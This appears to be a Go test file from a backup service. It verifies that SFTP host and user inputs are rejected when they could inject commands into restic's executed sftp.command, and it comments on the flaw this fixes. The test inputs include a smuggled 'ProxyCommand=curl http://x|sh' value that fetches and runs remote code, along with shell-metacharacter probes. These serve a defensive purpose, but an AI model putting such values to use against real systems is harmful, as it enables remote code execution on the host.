package api

import "testing"

// SFTP host and user end up inside the restic `-o sftp.command=...` string,
// which restic tokenizes on whitespace and then EXECUTES. Before this,
// validateSFTPInputs only checked they were non-empty, and SFTPCommandFlag
// interpolated them with a bare fmt.Sprintf("%s@%s") while quoting KeyPath
// immediately above — so a user of `u -o ProxyCommand=<cmd>` would split into
// extra ssh argv entries, and ProxyCommand runs through a shell.
//
// Admin-gated (/api/v1/admin/backup-destinations behind RequireAdmin), so this
// was a stored footgun rather than privilege escalation — an admin already has
// root through the agent. It is worth blocking because the value persists and
// fires later during unattended scheduled backups.
func TestValidateSFTPInputs_RejectsInjectableHostAndUser(t *testing.T) {
	t.Parallel()

	legit := []string{
		"backup.example.com",
		"192.0.2.10",
		"bkp-user",
		"normal_user-1.2",
		"host123",
	}
	for _, v := range legit {
		t.Run("accepts host "+v, func(t *testing.T) {
			err := validateSFTPInputs(&sftpRequestOptions{Host: v, User: "u", Path: "/backups"})
			if err != nil {
				t.Errorf("rejected a legitimate host %q: %v", v, err)
			}
		})
		t.Run("accepts user "+v, func(t *testing.T) {
			err := validateSFTPInputs(&sftpRequestOptions{Host: "h", User: v, Path: "/backups"})
			if err != nil {
				t.Errorf("rejected a legitimate user %q: %v", v, err)
			}
		})
	}

	nasty := []struct{ name, val string }{
		{"argv split into ssh options", "u -o ProxyCommand=curl http://x|sh"},
		{"tab split", "u\t-oProxyCommand=x"},
		{"newline", "u\nx"},
		{"semicolon", "a;b"},
		{"pipe", "a|b"},
		{"ampersand", "a&b"},
		{"dollar", "a$b"},
		{"backtick", "a`id`"},
		{"single quote", "a'b"},
		{"double quote", `a"b`},
		{"backslash", `a\b`},
		{"redirect", "a>b"},
		{"subshell parens", "a(b)"},
	}
	for _, tc := range nasty {
		t.Run("host/"+tc.name, func(t *testing.T) {
			if err := validateSFTPInputs(&sftpRequestOptions{Host: tc.val, User: "u", Path: "/b"}); err == nil {
				t.Errorf("accepted host %q — it reaches an executed sftp.command", tc.val)
			}
		})
		t.Run("user/"+tc.name, func(t *testing.T) {
			if err := validateSFTPInputs(&sftpRequestOptions{Host: "h", User: tc.val, Path: "/b"}); err == nil {
				t.Errorf("accepted user %q — it reaches an executed sftp.command", tc.val)
			}
		})
	}
}
